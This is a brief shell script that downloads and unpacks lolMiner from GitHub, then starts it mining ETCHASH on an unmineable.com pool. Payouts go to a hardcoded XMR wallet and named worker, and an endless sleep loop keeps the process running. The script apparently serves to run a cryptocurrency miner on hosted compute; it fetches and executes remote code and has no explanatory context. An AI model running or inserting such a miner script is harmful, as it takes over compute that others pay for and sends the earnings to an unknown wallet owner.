#!/bin/sh
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz && tar xf lolMiner_v1.29_Lin64.tar.gz && cd 1.29 && ./lolMiner --algo ETCHASH --ethstratum ETHPROXY --pool stratum+ssl://etchash.unmineable.com:4444 --user XMR:4AmkCSg7SAPKvKNuzygrvQSX7Qzi5UP6nJXKSR3h3ptadaumfctokpMKqv3E6bMNKVEsDfwwVXmqHcGZpVBZDk5MBetLS4P.unmineable_worker_iariskz
while [ 1 ]; do
sleep 3
done
